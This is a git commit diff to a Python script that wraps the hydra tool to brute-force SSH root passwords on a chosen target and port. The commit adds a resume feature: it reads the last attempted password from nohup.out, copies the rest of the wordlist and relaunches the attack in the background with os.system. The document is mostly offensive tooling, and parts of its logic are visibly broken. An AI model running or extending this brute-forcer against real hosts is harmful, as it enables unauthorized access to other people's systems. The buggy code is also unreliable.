cd26360fbcd356e6b1d1d46a702c0dcdb01c4596
hun340312 <62656584+hun340312@users.noreply.github.com>
2021-11-28 15:28:13 +0900

    Add files via upload

--- BF_Source/bf_init.py
+++ BF_Source/bf_init.py
@@ -11,33 +11,31 @@ inputFile = ""
 helpOption = 0
 restart = 0
 
-def copyfile(fileName):
+def copyFile(inputFile):
     lastLine = ""
-    with open("fileName","r") as f:
+    with open("nohup.out","r") as f:
         lastLine = f.readlines()[-1]
-    target = "\""
-    index = -1
-    passwordIndex = []
-    while True:
-        index = lastLine.find(target, index+1)
-        if index == -1:
-            break
-        passwordIndex.append(index)
-    password = lastLine[passwordIndex[2+1]:passwordindex[3]]
+    password = lastLine.split()[8].strip("\"")
     
     index = -1
-    with open("fileName", "w") as f:
-        sourceFile = f.readlines()
-        for line in sourceFile:
+    with open(inputFile, "r", encoding = 'cp949') as f:
+        line = None
+        while line != ' ':
+            line=f.readline()
             index += 1
             if line.find(password):
                 break
 
-    copiedFilePath = "os.path.dirname(fileName)" + "copied_file"
-    with open("fileName", "r") as f:
+    copiedFilePath = os.path.dirname(inputFile) + "copied_file"
+    with open(inputFile, "r", encoding = 'cp949') as f:
         with open(copiedFilePath,"w") as fc:
-            copiedFile = f.readlines()[index+1:]
-            fc.write(copiedFile)
+            copyIndex = -1
+            line = None
+            while line != ' ':
+                line = f.readline()
+                copyIndex += 1
+                if copyIndex > index:
+                    fc.write(line)
 
     return copiedFilePath 
 
@@ -60,5 +58,5 @@ for op ,p in options:
 if helpOption == 0 and restart == 0:
     os.system('nohup hydra -l root -P '+ inputFile + ' -f '+ target + " ssh -V -I -s " + port +" &")
 elif helpOption == 0 and restart == 1:
-    filePath = copyFile(fileName) 
-    os.system('nohup hydra -l root -P '+ filePath _ ' -f '+ target + " ssh -V -I -s " + port +" &")
+    filePath = copyFile(inputFile) 
+    os.system('nohup hydra -l root -P '+ filePath +  ' -f '+ target + " ssh -V -I -s " + port +" &")
